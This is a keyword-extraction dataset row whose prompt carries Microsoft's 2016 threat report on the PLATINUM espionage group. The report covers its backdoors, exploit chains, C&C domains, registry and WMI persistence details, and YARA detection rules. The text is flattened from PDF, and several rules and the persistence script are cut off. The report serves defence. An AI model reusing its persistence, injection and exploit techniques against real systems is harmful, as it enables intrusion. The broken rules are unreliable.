Generated Text,Reference Text,Prompt Text,Meta Info
PLATINUM; targets; Southeast Asia; zero-day; exploits; CVE-2015-2545; backdoor malware; privileges; access; custom malware; persistence; modules; the malware; persistence; IP; data; a phishing email; a remote shell; the group; techniques; detection; the threat actors; tactics; 10; the attack.,"[""1. PLATINUM profiles potential targets in South and Southeast Asia, focusing on government entities. 2. Spear phishing emails are sent to specific users with malicious attachments. 3. Attachments contain exploits for undisclosed zero-day vulnerabilities. 4. Exploits allow executing PLATINUM's custom backdoor malware like Dipsind or JPIN. 5. Backdoors connect to command and control servers on compromised infrastructure. 6. PLATINUM can sustain access to compromised networks undetected for years. 7. Various tools are deployed for credential theft, lateral movement, reconnaissance, and exfiltration. 8. New versions of backdoors and tools are continually developed. 9. Infrastructure analysis reveals details of domains, IPs, dynamic DNS used for command and control. 10. Forensic artifacts provided for detection including YARA rules, file hashes, and network IOCs. ""]","Extract the keywords: PLATINUM Targeted attacks in South and Southeast AsiaWindows Defender Advanced Threat Hunting Team | April 2016This document is for informational purposes only. MICROSOFT MAKES NO WARRANTIES, EXPRESS, IMPLIED, OR STATUTORY, AS TO THE INFORMATION IN THIS DOCUMENT. This document is provided “as-is.” Information and views expressed in this document, including URL and other Internet website references, may change without notice. You bear the risk of using it. Copyright © 2016 Microsoft Corporation. All rights reserved. The names of actual companies and products mentioned herein may be the trademarks of their respective owners. Table of contentsPLATINUM: Targeted attacks in South and Southeast Asia 4 Adversary profile 4 Methods of attack 6 Technical details 11 Hot patcher 19 Miscellaneous 20 Exploit (CVE-2015-2545) 20 Detection indicators 24PLATINUM: Targeted attacks in South and Southeast AsiaMicrosoft proactively monitors the threat landscape for emerging threats. Part of this job involves keeping tabs on targeted activity groups, which are often the first ones to introduce new exploits and techniques that are later used widely by other attackers. In the previous volume, “STRONTIUM: A profile of a persistent and motivated adversary,” on page 3 of Microsoft Security Intelligence Report, Volume 19 (January–June 2015), chronicled the activities of one such group, which had attracted interest because of its aggressive, persistent tactics and techniques as well as its repeated use of new zero-day exploits to attack its targets. This section describes the history, behavior, and tactics of a newly discovered targeted activity group, which Microsoft has code-named PLATINUM. Microsoft is sharing some of the information it has gathered on this group in the hope that it will raise awareness of the group’s activities and help organizations take immediate advantage of available mitigations that can significantly reduce the risks they face from this and similar groups. Adversary profile PLATINUM has been targeting its victims since at least as early as 2009, and may have been active for several years prior. Its activities are distinctly different not only from those typically seen in untargeted attacks, but from many targeted attacks as well. A large share of targeted attacks can be characterized as opportunistic: the activity group changes its target profiles and attack geographies based on geopolitical seasons, and may attack institutions all over the world. Like many such groups, PLATINUM seeks to steal sensitive intellectual property related to government interests, but its range of preferred targets is consistently limited to specific governmental organizations, defense institutes, intelligence agencies, diplomatic institutions, and telecommunication providers in South and Southeast Asia. The group’s persistent use of spear phishing tactics (phishing attempts aimed at specific individuals) and access to previously undiscovered zero-day exploits have made it a highly resilient threat. After researching PLATINUM, Microsoft has identified the following key characteristics of the group and its activities:• PLATINUM has conducted several cyber espionage campaigns since at least 2009. • PLATINUM focuses on a small number of campaigns per year, which reduces the risk of detectionand helps the group stay unnoticed and focused for a longer period of time. • PLATINUM has focused on targets associated with governments and related organizations in SouthPLATINUM has been targeting its victims since at least as early as 2009. and Southeast Asia. • day exploits against its victims. PLATINUM has used multiple unpatched vulnerabilities in zero-Spear phishing is the group’s main method of infecting• targeted users’ computers. • PLATINUM makes a concerted effort to hide their infection tracks, by self-deleting malicious components, or by using server side logic in ‘one shot mode’ where remotely hosted malicious components are only allowed to load once• PLATINUM often spear phishes its targets at their non-official or private email accounts, to use as astepping stone into the intended organization’s network. • PLATINUM uses custom-developed malicious tools and has the resources to update theseapplications often to avoid being detected. • PLATINUM configures its backdoor malware to restrict its activities to victims’ working hours, in anattempt to disguise post-infection network activity within normal user traffic. • PLATINUM does not conduct its espionage activity to engage in direct financial gain, but insteaduses stolen information for indirect economic advantages. •In some cases, the combination of these mechanisms—use of undisclosed zero-day exploits, custom malware that is not used elsewhere, PLATINUM’s skill in covering its tracks, and others—has enabled the group to compromise targets for several years without being detected. Targeted activity groups are skilled at covering their tracks and evading detection, and it can be very difficult to definitively associate an activity group with a specific nation-state or group of individuals. Attackers could be patriotic groups, opportunistic cyber units, state-sponsored hackers, or intelligence agents. Although PLATINUM could belong to any one of the aforementioned categories, the group shows traits of being well funded, organized, and focused on information that would be of most use to government bodies. Methods of attack Figure 1. Known victims attacked by PLATINUM since 2009, by country/region (left) and type of institution (right)Malaysia 51.4%ISP24.3%Other 25.7%Other 4.3% Thailand2.9%India 4.3%Singapore4.3%Indonesia21.4%China 11.4%Gov’t - Defense7.1%Gov’t -Diplomatic7.1%Othergovernment31.4%Academic1.4%Gov’t -Intelligence2.9%PLATINUM primarily targets its intended victims using spear phishing. There is also some data indicating the group’s usage of drive-by attacks against vulnerable browser-plugins. Although the group’s methods for performing reconnaissance to determine who to pursue remains unknown, the number of victims targeted at each affected institution is consistently very small. In some cases, the victims were targeted at their non-official email addresses, demonstrating that the scope of PLATINUM’s research capabilities is fairly extensive. For the initial infection, PLATINUM typically sends malicious documents that contain exploits for vulnerabilities in various software programs, with links or remotely loaded components (images or scripts or templates) that are delivered to targets only once. The group has made concerted efforts towards designing their initial spear-phishes in a manner where the final payload is only delivered to the intended victim. The group is known to have used a number of zero-day exploits, for which no security update is available at the time of transmission, in these attempts. (All have subsequently been addressed by security updates from the affected vendors.)Figure 2. A typical lure document sent by PLATINUM to a prospective victimLure documents are typically given topical names that may be of interest to the recipient. Such lures often address controversial subjects or offer provocative opinions, in an effort to incite the reader into The real reason Prabowo wants to be President.doc Malaysia a victim of American irregular warfare ops.doc Tu Vi Nam Tan Mao 2011.doc Indians having fun.docThese documents were sent to intended victims in Vietnam, Indonesia, India, and Malaysia, and the filenames contain references to cities, politicians, and current events in those locations. The oldest confirmed PLATINUM exploit was named “The corruption of Mahathir,” a document that was transmitted in 2009 referencing the former prime minister of Malaysia, Mahathir Mohamad. Figure 4. The oldest confirmed lure document sent by PLATINUM, in 2009PLATINUM’s recent activities remain focused on tactics such as these. In February 2016, PLATINUM was observed using a legitimate website dedicated to news about the Indian government, as an infection vector. This site, which is not associated with the Indian government itself, also provides a free email service for its users, giving them email addresses with the site’s own domain name. PLATINUM sent spear phishing messages to users of the service, which included some Indian government officials. Afterinfecting an unsuspecting user this way, the attackers had complete control of the user’s computer and used it as a stepping stone into the official network to which the user belonged. Figure 5. PLATINUM used a private webmail service to infect a government networkPLATINUM’s approach toward exploiting vulnerabilities varies between campaigns. In one case from 2013, the target was sent a malicious document through a spear phishing email message. 1 The document, when opened, used an embedded ActiveX control to download a JavaScript file from a remote site that used a previously unknown vulnerability in some versions of Windows (later designated CVE-2013-7331) to read information about the browser’s installed components.21 Microsoft thanks Google for identifying and reporting this attack. Filename Gerakan Anti SBY II.doc Wikileaks Indonesia.doc Top 11 Aerial Surveillance Devices.doc mister.nofrillspace.com/users/web8_dice/4226/space.gifintent.nofrillspace.com/users/web11_focus/3807/space.gifwww.police28122011.0fees.net/pages/013/space.gifFigure 7. Malicious JavaScript used by PLATINUM to perform fingerprinting on a victim’s browserWhile fingerprinting the versions of the browser plugins, the script loads a remotely hosted malicious PNG file that exploited another previously unknown vulnerability (designated CVE-2013-1331), which affected Microsoft Office 2003 SP3.3 Exploiting the vulnerability resulted in memory corruption, which allowed the attacker to execute remote code on the computer.Figure 8. An exploit mechanism used by PLATINUMAlso a combination of lure documents with the aforementioned embedded ActiveX control was seen along with a Dipsind executable named as ‘pp4x322.dll’ during a different attack. The unique name of this executable indicated a possible DLL side-loading vulnerability also being used by PLATINUM against Powerpoint 2007.In another case from August 2015, Microsoft investigated a malicious document (named Resume.docx) that had been uploaded to the VirusTotal malware analysis service.4 The person who submitted the file3 Microsoft issued Security Bulletin MS13-051 in June 2013 to address the issue. 4 Microsoft thanks FireEye for identifying and reporting this attack.did so through an IP address based in India, suggesting that the person or their organization had been targeted by the spear phish document.Figure 9. A malicious Word document used by PLATINUM to target a victimWhen the document was opened in Word, it exploited a previously unknown vulnerability in the Microsoft Office PostScript interpreter (designated CVE-2015-2545) that enabled it to execute the attacker’s code and drop an attacker-generated malicious DLL onto the computer.5 The DLL exploited another previously unknown vulnerability (designated CVE-2015-2546) in the Windows kernel, which enabled it to elevate privileges for the Word executable and subsequently install a backdoor through the application.6 Researching this attack and the malware used therein led Microsoft to discover other instances of PLATINUM attacking users in India around August 2015.Figure 10. Another exploit mechanism used by PLATINUM5 Microsoft issued Security Bulletin MS15-099 in September 2015 to address the issue. Windows 10 is not affected by the exploit used in this case due to built-in mitigations. 6 Microsoft issued Security Bulletin MS15-097 in September 2015 to address the issue.In total, PLATINUM made use of four zero-day exploits during these two attack campaigns (two remote code execution bugs, one privilege escalation, and one information disclosure), showing an ability to spend a non-trivial amount of resources to either acquire professionally written zero-day exploits from unknown markets, or research and utilize the zero-day exploits themselves. In both these campaigns the activity group included remote triggers to deactivate exploitation, with an attempt to conceal the vulnerability, and prevent analysis of the attack. The resources required to research and deploy multiple zero-day exploits within the same attack campaign are considerable. Such activity requires a significant amount of investment in research and development, along with the discipline to ensure that the exploits are not used until the appropriate time, and that no one involved with the project leaks them to other parties.PLATINUM used four zero-day ex- ploits during these two campaigns.Technical details After gaining access to a victim’s computer, PLATINUM installs its own custom-built malware to communicate with the compromised system, issue commands, and move laterally through the network. The wide collection of backdoors and tools, and the differences between them, suggest the involvement of multiple teams or vendors in the development process. This section describes some of the tools used by the group.DipsindPLATINUM uses a number of different custom-developed backdoors to communicate with infected computers. The lack of any significant evidence of shared code between any of these backdoor families is another clue as to the scope of the resources on which the activity group is able to draw, and the precautions the group is willing and able to take in order to avoid losing its ability to conduct its espionage operations.The group’s most frequently used backdoors belong to a malware family that Microsoft has designated Dipsind, although some variants are detected under different names. Multiple Dipsind variants have been identified, all of which are believed to be used exclusively by PLATINUM.The first variant, Win32/Dipsind.A!dha, is a lightweight application providing backdoor access to remote attackers. It can be customized for every victim to ensure that it remains undetected in targeted networks. It supports a small set of instructions that allow the attacker to perform basic functions, such as uploading or downloading files and spawning remote shells.Figure 11. Sample configuration file for Win32/Dipsind.AEach Dipsind file contains an embedded encrypted configuration file that acts as a control for the backdoor. This configuration file also includes the initial command and control (C&C) location the Dipsind backdoor uses in addition to the pollcommandsite variable which references a URL where additional backup C&Cs can be polled. Configurable parameters include instructions on where Dipsind should install a copy of cmd.exe for spawning a remote shell, depending on the user’s privileges, the hours during which the backdoor should function, and exfiltrate information. This capability allows the backdoor to confine its activities to normal working hours, making its communications harder to distinguish from normal network traffic.Dipsind has been observed using a combination of IP addresses and domains for its C&C infrastructure. The domains are a mix of registered domains and free subdomains obtained through dynamic DNS providers. Collected data showed that a vast majority of victim networks allowed unfiltered access to the dynamic DNS hosts. The hosts and domains are hosted on compromised infrastructure based in several different countries, some within academic institutions. In some cases, the backdoors are configured to connect to IP addresses instead of domain names. These factors make it challenging to locate the activity group’s infrastructure.Figure 12 shows a sampling of C&C infrastructure used by PLATINUM between 2009 and 2015.Figure 12. Some of the domains and addresses used by PLATINUMRegistered domainsDynamic DNS• •box62.a-inet.net eclipse.a-inet.net joomlastats.a-inet.net updates.joomlastats.co.cc server.joomlastats.co.cc• scienceweek.scieron.com • mobileworld.darktech.org • geocities.efnet.at • bpl.blogsite.org • wiki.servebbs.netHardcoded IPs• network traffic is over HTTP, base64 encoded, with the underlying data encrypted using AES256 in ECB mode. Authentication is a five-step process, as shown in the following figure:Figure 13. Win32/Dipsind.A initial communication protocol (as decrypted)Analysis of several samples of this variant show exactly the same AES key (AOPSH03SK09POKSID7FF674PSLI91965) in use since 2009. The initial HTTP POST made by this backdoor appears as “ud7LDjtsTHe2tWeC8DYo8A**”, which translates to a simple whitespace. This sequence makes a simple network indicator usable by defenders.A second Dipsind variant registers as a Winlogon Event Notify DLL. This backdoor contains a minimized feature list from the original Dipsind variant, and supports a more limited number of commands.It sets the following registry keys in the HKEY_LOCAL_MACHINE hive for persistence and functionality:• SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\Cscdll32\Asynchronous • SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\Cscdll32\DllName • SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\Cscdll32\Impersonate • SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\Cscdll32\Startup • SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\Cscdll32\shutdown • SOFTWARE\Microsoft\Windows\CurrentVersion\Run\cscdll32 There are at least two additional minor versions of this variant, each of which show improvements in command implementation.One interesting feature of this variant is the way it implements a mechanism similar to port knocking to allow remote attackers to connect to a compromised computer without leaving any connection open for too long. The sequence of events is as follows:1. The backdoor is installed via an exploit. 2. The backdoor sets a registry key to open a specific UDP port through the local firewall, if any, andlistens to the port for incoming traffic.3. At a remote location, the attacker executes a tool (called PK2 here, although the actual name of thetool is unknown) using the following parameters:Pk2.exe <IP> <UDP Port> <TCP Port> <Password>where the IP address is that of the computer with the backdoor, the UDP port is the one specified by the backdoor, and the password is a string encrypted by the tool before being sent. 4. The backdoor receives the UDP packets, and then checks to see if the password is valid. 5.If the password is indeed valid, the backdoor will wait for exactly 20 seconds and only then open the PK2 specified TCP port for a window of 3 seconds.Figure 14. How the Dipsind knocker component communicates with an attackerPK2 is also designed to connect to such open TCP ports and act as a console client for issuing commands to the backdoor. When running PK2 as a console client, the attacker needs to re-enter the password to authenticate a second time against the backdoor, and issue commands such as #sz to upload a file and #rz to download a file. During this research, one such collection of tools was obtained that had the password set to “t@ng0p@ss”. All communication used by this backdoor and PK2 is encrypted. If a connection from PK2 is not received within the 3-second window, the TCP port is shut and PK2 would need to reinitialize the port-knocking process.JPINIn addition to Dipsind and its variants, PLATINUM uses a few other families of custom-built backdoors within its attack toolset. These families of backdoors are significantly different in their capabilities and have completely different code bases. While one family relies on a small number of supported commands and simple shells, the other delves into more convoluted methods of injections, checks, and supported feature sets.Microsoft researchers refer to one such set of backdoor variants collectively as “JPIN,” which is the name of a service it uses when installed. JPIN is a comprehensive tool for executing and extracting information from the compromised computer. There is strong evidence to suggest that the developers of the JPIN and Dipsind code bases were in some way related.JPIN has its own installer and uninstaller component, which deletes itself when it encounters a version of Windows earlier than Windows XP, or finds any of these security-related processes running:Figure 15. Security-related processes avoided by the JPIN installerProcess360tray.exe zhudongfangyu.exeSecurity product360 Safeguard Sophos Anti-Virus Kaspersky Anti-Virus Rising Anti-virus 360 SafeguardAfter installing the backdoor, the installer deletes itself from the compromised computer.PLATINUM uses at least three distinct JPIN variants. One variant typically runs with a mutex named “hMSVmm” and installs itself in the folders %appdata%\Comm\Jpin and %userprofile%\AppData\Resource\Jpin. After it is installed and started, the JPIN service can perform the following tasks, among others:• Obtain information about the computer, such as operating system version, user name, privileges,disk space, and so on.• List running services, processes, job IDs, and task IDs. • Enumerate drives and their types. • Enumerate registry keys. • Load a custom keylogger. • Download files. • Download and upgrade itself. • Acquire network information such as DNS, IP, proxies, and so on. • Exfiltrate information over HTTP GET and POST requests, with the data stored either within theHTTP body or within the URL parameters.• Lower security settings by tampering with registry keys. •Inject content into the lsass.exe process, in order to load the keylogger module into lsass and call its exported function.• Communicate via FTP. • Send email via SMTP. • Change permissions on files using the cacls.exe command-line utility. JPIN can also target mobile suite applications and extract data from them. The backdoor contains code that looks for installed instances of Symbian, Blackberry, and Windows Phone management applications. If any are found, the backdoor logs sync dates, IMEI data, phone manufacturer and model information, software version date, memory, location, and capacity, among other things.JPIN can target mobile suite appli- cations and extract data from them.The second JPIN variant is very similar to the first one. It downloads the backdoor payload from remote locations via the BITS service, using the COM object for BITS. This variant also has its own installer and uninstaller component, which deletes itself when it encounters a version of Windows earlier than Windows XP, or finds any of the processes listed in Figure 15 running.The third known variant does not check for the processes listed in Figure 15. It uses an installer component that includes the backdoor as payload disguised as a bitmap within its resource section. The payload is in an encrypted and compressed form, disguised to avoid any suspicion from security solutions. This variant has been seen installing itself into the following file system paths:• %appdata%\Java\support • %appdata%\support • %userprofile%\AppData\Local\Java\Support • %userprofile%\AppData\Local\SupportadbupdAnother backdoor used by PLATINUM is very similar to the Dipsind family. It is informally referred to internally at Microsoft as “adbupd”, which is the name of the service under which it is installed. Salient features of this backdoor include the following:It tries to install itself under several different names within the Program Files directoryIt has the ability to support plug-ins to modularize functionalityIt contains a copy of the OpenSSL library to support encryption when sending or receiving data• • The configuration file is very similar to the original Dipsind family • This backdoor class uses multiple methods of achieving persistence, one of which is using WMIIt contains functionality to run a copy of cmd.exe/MOF compiled scripts, such as the one shown in Figure 16.Figure 16. WMI script used by the Adpupd backdoor to achieve persistence #pragma namespace(""\\\\.\\ROOT\\cimv2"") instance of __Win32Provider as $P ClsId = ""{74ba9ce4-fbf1-4097-32b8-34f446f037d8}""; instance of __EventConsumerProviderRegistration class adbupdConsumer : __EventConsumer { [key] string Mode; }; instance of adbupdConsumer as $CONSMR instance of __EventFilter as $FLT Query = ""SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA instance of __FilterToConsumerBinding as $B };KeyloggersThe PLATINUM group has written a few different versions of keyloggers that perform their functions in different ways, most likely to take advantage of different weaknesses in victims’ computing environments. The keyloggers can be broadly classified into two groups: those that log keystrokes through raw device input, and user mode keyloggers that use Windows hook interfaces to gather information. In particular, this second group also has the capability of dumping users’ credentials using the same technique employed by Mimikatz. Both groups can set permissions on specific files to Everyone, and work in tandem with the PLATINUM backdoors.Hot patcherOne of PLATINUM’s most recent and interesting tools is meant to inject code into processes using a variety of injection techniques. In addition to using several publicly known injection methods to perform this task, it also takes advantage of an obscure operating system feature known as hot patching.Hot patching is an operating system-supported feature for installing updates without having to reboot or restart a process. At a high level, hot patching can transparently apply patches to executables and DLLs in actively running processes, which does not happen with traditional methods of code injection such as CreateRemoteThread or WriteProcessMemory. Instead, the kernel is instructed to perform the injection by invoking NtSetSystemInformation (with an appropriate SystemInformationClass) to apply the patch. The information about the patch is delivered via a specially crafted DLL that is loaded into the target process.The hot patching feature originally shipped with Windows Server 2003 and was used to ship 10 patches to Windows Server 2003. It was removed in Windows 8 and has not been included in subsequent releases of Windows. PLATINUM appears to believe that enough of their targeted users continue to run the earlier versions of Windows to make the technique a useful tool, at least until early 2017 (see page 20).The technique PLATINUM uses to inject code via hot patching was first documented by security researchers in 2013.7 Administrator permissions are required for hot patching, and the technique used by PLATINUM does not attempt to evade this requirement through exploitation. Rather, the component’s use of the hot patching feature appears to be a way to avoid being detected, as many antivirus solutions monitor non-system processes for the regular injection methods such as CreateRemoteThread. If the tool fails to inject code using hot patching, it reverts to attempting the other more common code injection techniques into common Windows processes, primarily targeting winlogon.exe, lsass.exe and svchost.exe:• CreateRemoteThread The hot patching component performs the following steps:1.It patches the loader with a proper hot patch to treat injected DLLs with execute page permissions. This step is required for DLLs loaded from memory (in an attempt to further conceal the malicious code).7 Alex Ionescu, “Hotpatching the Hotpatcher: Stealth File-less DLL Injection,” SyScan 2013, url The backdoor is injected into svchost using the hot patch API. Patching the loader is done by creating a section named \knowndlls\mstbl.dll. This DLL does not reside on disk, but is rather treated as a cached DLL by the session manager. It then proceeds to write a PE file within that section.3. The PE file will have one section (.hotp1) with the hot patch header structure. This structure containsall the information necessary to perform the patching of function ntdll!LdrpMapViewOfSection, which will cause the loader to treat created sections as PAGE_EXECUTE_READWRITE instead of PAGE_READWRITE. The patch is successfully applied by invoking NtSetSystemInformation.4. After the memory permission issue is solved, the injector proceeds to inject the malicious DLL intosvchost. Again, it creates a (now executable) section named knowndlls\fgrps.dll and invokes NtSetSystemInformation, which causes the final payload to be loaded and executed within the target process (svchost).5. The malicious hot patching component appears to have an expiration date of January 15, 2017.After that date, the DLL will no longer perform the injection, but rather execute another PLATINUM implant (C:\Program Files\Windows Journal\Templates\Cpl\jnwmon.exe –ua), which may be related to an uninstall routine. (The component has not been observed in use since March 9, 2016, which may indicate that PLATINUM has chosen to stop using it earlier than the configured expiration date.)MiscellaneousFinally, the PLATINUM group also uses small single-purpose applications that duplicate some of the functionality of the backdoors. A couple of examples are:• A stand-alone persistence tool that takes other files as input and ensures persistence acrossreboots.• A stand-alone loader that runs another executable. It has some exported functions whose namescan be used in DLL files installed as LSA password filters, but such functions are basically empty and there is no known evidence that this tool was ever used in this way. On the whole, this DLL looks like a test, suggesting that the attackers may have researched and possibly implemented variants of their malware that can be installed as LSA password filters.Exploit (CVE-2015-2545) CVE-2015-2545 is a use-after-free vulnerability in the embedded PostScript filter of Microsoft Office.8 The exploit was crafted in PostScript and is able to bypass Address Space Layout Randomization (ASLR) and Data Execution Prevention (DEP).8 Microsoft issued Security Bulletin MS15-099 in September 2015 to address the issue.This vulnerability allowed the attacker to forge a CAssoc structure, shown in Figure 17, and so also indirectly the PSObjs in the structure. The PostScript interpreter deciphers the value field (Val) based on the type field (m_type), which are under complete control of the attacker. Having developed this technique, the attacker will craft and use a combination of file, string, and integer objects to gain a reliable arbitrary code execution.Figure 17. Memory layout of CSssoc structure and its embedded PSObjsRoot cause:The attacker defined in PostScript a dictionary with three elements, which leads to an allocation of three CAssoc structures in PSTMap.Within a Forall loop, the last two elements are undefined and a string is initialized. The PostScript statement results in a deallocation of the last two CAssoc structures and the string gets allocated in the previously freed memory address. The PostScript-put operand is used to fill the string with data to mimic a CAssoc structure. By setting the hash table index to 0x3ff, the loop will exit because the hash table at that time has a max-size of 0x400. Upon exiting the loop, a reference will be returned to the secondary element, which is the forged structure.Figure 18. Reusage of deallocated Memory by a forged CAssoc StructureAcquire full memory RW access: The described method is used to craft a PSString object in which the length of the string is set to a maximum value. As a result, the exploit can use PostScript methods to search for ROP gadgets to dynamically assemble a ROP shellcode.Figure 19. Getinterval method of PSString is used to find ROP gadgetsThe purpose of this approach is to call VirtualProtect to set the pages of the second-stage shellcode as executable. As a result, DEP and ASLR are bypassed.Arbitrary code execution: To redirect code execution to the ROP chain, the exploit crafts a PSFile Object in which the vtable is controlled by the attacker. By calling the bytesavailable method within the PostScript code, arbitrary code execution is achieved.Identity Although the exact identity of PLATINUM remains unknown, the technical indicators observed so far can help create a profile of the attacker.• Usage of multiple backdoors. The different backdoors written by or for the group indicate aconsiderable investment over time. Research indicates that PLATINUM has used multiple backdoors concurrently at times, which could represent either multiple teams within the activity group performing different campaigns, or different versions of the tools being used against varying victim networks.• Zero day exploits. PLATINUM has used several zero-day exploits against their victims. Regardless ofwhether they researched the exploits themselves or purchased them from independent researchers, the monetary investment required to collect and deploy zero-day exploits at this level is considerable.• Victim geography. More often than not, research into targeted attacks shows activity groups becoming opportunistic and attacking topical targets; that is, targets considered valuable based on the geopolitical events of the year. PLATINUM has consistently targeted victims within a small set of countries in South and Southeast Asia. In addition, the victims are consistently associated with a small set of entities that are directly or indirectly connected to governments.• Tools. Some of the tools used by PLATINUM, such as the port-knockingThe monetary in- vestment required to collect and deploy zero-day exploits at this level is considerable.backdoor, show signs of organized thinking. PLATINUM has developed or commissioned a number of custom tools to provide the group with access to victim resources. This behavior exhibits PLATINUM’s ability to adapt to victim networks, which is further evidence of the group’s considerable resources for development and maintenance.Any of these traits by themselves could be the work of a single resourceful attacker or a small group of like-minded individuals, but the presence of all of them is a clear indication of a well- resourced, focused, and disciplined group of attackers vying for information from government- related entities.Guidance PLATINUM is an extremely difficult adversary for targeted organizations to defend against. It possesses a wide range of technical exploitation capabilities, significant resources for researching or purchasing complicated zero-day exploits, the ability to sustain persistence across victim networks for years, and the manpower to develop and maintain a large number of tools to use within unique victim networks. Their ability to research their victims prior to targeting them, along with the capability to architect exploits that only work once or for a short period of time, makes it very difficult to investigate or track their activities. That said, there are steps that organizations can take to reduce the likelihood of PLATINUM conducting successful attacks against their employees and networks.• Take advantage of native mitigations built into Windows 10. Newer versions of Windows includecritical mitigations that render some of PLATINUM’s exploits ineffective when deployed. For example, the summer 2015 attack that used the unusual ‘resume’ would not have been successful on Windows 10 as-is because of the presence of the Supervisor Mode Execution Prevention (SMEP) mitigation, even without the latest security updates installed. Even if CVE-2015-2546 affected Windows 10, the exploitation would have required much more technical prowess to succeed; ultimately, SMEP makes it more difficult for attackers. The hooking and in-memory patching techniques used by the malicious ‘hot patcher’ component are also not effective against newer versions of Windows.• Apply all security updates as soon as they become available. Microsoft deeply researches eachsecurity issue, proactively addresses the flaw, and mitigates the attack surface around the affected component(s). For example, one zero-day vulnerability exploit (CVE-2015-2545) used by PLATINUM was addressed immediately in September 2015. Subsequently, in November, Microsoft also released a proactive security update for the same component that ended up mitigating other exploits surfacing in-the-wild after the first attack. Customers who applied the security updates in November without delay would have been protected against the second wave of exploits. Such measures of hardening the underlying application happen often. MS09-017 is yet another example, in which installation of newly available security updates significantly reduced the attack surface.• Consider disabling features, such as EPS or macros, in powerful products like Microsoft Office by using Group Policy. Not all organizations find the need to enable all features. For example, in the PLATINUM attack campaign that used CVE-2015-2545, a network in which Office EPS was disabled would not have been affected.• Enterprise networks should segregate high business impact (HBI) data-holding segments from Internet-connected networks. Sharing of removable media between these air-gapped networksshould be strictly enforced. In the case of PLATINUM, such a network architecture would prevent targeted users from accessing third-party email services and thereby granting attackers access to sensitive segments of the organizational network.• Conduct enterprise software security awareness training, and build awareness of malwareprevention. PLATINUM may have used zero-day flaws to compromise victim computers, but doing so required action by the user, who either clicked a link in an email or opened an attachment to allow the attacker to take control of their computer. Security training can raise awareness and reduce the risk associated with this attack vector.Apply all security updates as soon as they become available.•Institute a strong network firewall and proxy. Many tools used by attackers are not compatible with network proxies. In the case of PLATINUM’s version of port- knocking, the opening of a UDP port would have been rendered moot if a network firewall was blocking access for inbound packets to the host’s open port.• Enterprise networks should consider blocking certain types of websites that don’t serve the interestof the business. PLATINUM makes extensive use of C&Cs that use dynamic DNS hosts. Although such free services can be very useful at a personal level, blocking access to such hosts at a local DNS server can minimize post-compromise activity.• Prepare your network to be forensically ready, so that you can achieve containment and recovery ifa compromise occurs. A forensically ready network that records authentications, password changes, and other significant network events can help identify affected systems quickly. • Make sure that your organization’s Internet-facing assets are always running up-to-dateapplications and security updates, and that they are regularly audited for suspicious files and activity. A number of researched PLATINUM victims had their public-facing infrastructure compromised through unknown flaws.Detection indicators Figure 20 consists of detection rules for a number of PLATINUM malware samples to be used with YARA (url an open source pattern matching tool for malware detection.Figure 20. Detection indicators for PLATINUM malware rule Trojan_Win32_PlaSrv : Platinum description = ""Hotpatching Injector"" version = ""1.0"" last_modified = ""2016-04-12""strings: $Section_name = "".hotp1"" $offset_x59 = { C7 80 64 01 00 00 00 00 01 00 } $Section_name and $offset_x59 rule Trojan_Win32_Platual : Platinum description = ""Installer component"" version = ""1.0"" last_modified = ""2016-04-12"" $scrambled_dir = { A8 8B B8 E3 B1 D7 FE 85 51 32 3E C0 F1 B7 73 99 } $class_name and $scrambled_dir rule Trojan_Win32_Plaplex : Platinum description = ""Variant of the JPin backdoor"" version = ""1.0"" last_modified = ""2016-04-12"" $class_name1 and $class_name2 rule Trojan_Win32_Dipsind_B : Platinum author = ""Microsoft""description = ""Dipsind Family"" version = ""1.0"" last_modified = ""2016-04-12"" strings: $frg1 = {8D 90 04 01 00 00 33 C0 F2 AE F7 D1 2B F9 8B C1 8B F7 8B FA C1 E9 02 F3 A5 8B C8 83 E1 03 F3 A4 8B 4D EC 8B 15 ?? ?? ?? ?? 89 91 ?? 07 00 00 } $frg2 = {68 A1 86 01 00 C1 E9 02 F3 AB 8B CA 83 E1 03 F3 AA} $frg3 = {C0 E8 07 D0 E1 0A C1 8A C8 32 D0 C0 E9 07 D0 E0 0A C8 32 CA 80 F1 63} $frg1 and $frg2 and $frg3 } rule Trojan_Win32_PlaKeylog_B : Platinum description = ""Keylogger component"" version = ""1.0"" last_modified = ""2016-04-12"" strings: $hook = {C6 06 FF 46 C6 06 25} $dasm_engine = {80 C9 10 88 0E 8A CA 80 E1 07 43 88 56 03 80 F9 05} $hook and $dasm_engine } rule Trojan_Win32_Adupib : Platinum description = ""Adupib SSL Backdoor"" version = ""1.0"" last_modified = ""2016-04-12"" $str2 = ""OP_TIME(end hour)"" $str3 = ""%d:TCP:*:Enabled"" $str4 = ""%s[PwFF_cfg%d]"" $str5 = ""Fake_GetDlgItemTextW: ***value***=""condition: $str1 and $str2 and $str3 and $str4 and $str5 } rule Trojan_Win32_PlaLsaLog : Platinum description = ""Loader / possible incomplete LSA Password Filter"" version = ""1.0"" last_modified = ""2016-04-12"" strings: $str1 = {8A 1C 01 32 DA 88 1C 01 8B 74 24 0C 41 3B CE 7C EF 5B 5F C6 04 01 00 5E 81 C4 04 01 00 00 C3} $str1 and $str2 } rule Trojan_Win32_Plagon : Platinum description = ""Dipsind variant"" version = ""1.0"" last_modified = ""2016-04-12"" $str2 = {64 6F 67 32 6A 7E 6C} $str3 = ""Dqpqftk(Wou\""Isztk)"" $str1 and $str2 and $str3 and $str4 } rule Trojan_Win32_Plakelog : Platinum description = ""Raw-input based keylogger"" activity_group = ""Platinum"" version = ""1.0"" last_modified = ""2016-04-12"" $str1 = ""<0x02>"" wide $str2 = ""[CTR-BRK]"" wide $str3 = ""[/WIN]"" wide $str4 = {8A 16 8A 18 32 DA 46 88 18 8B 15 08 E6 42 00 40 41 3B CA 72 EB 5E 5B} $str1 and $str2 and $str3 and $str4 } rule Trojan_Win32_Plainst : Platinum description = ""Installer component"" version = ""1.0"" last_modified = ""2016-04-12"" strings: $str1 = {66 8B 14 4D 18 50 01 10 8B 45 08 66 33 14 70 46 66 89 54 77 FE 66 83 7C 77 FE 00 75 B7 8B 4D FC 89 41 08 8D 04 36 89 41 0C 89 79 04} $str2 = {4b D3 91 49 A1 80 91 42 83 B6 33 28 36 6B 90 97} $str1 and $str2 } rule Trojan_Win32_Plagicom 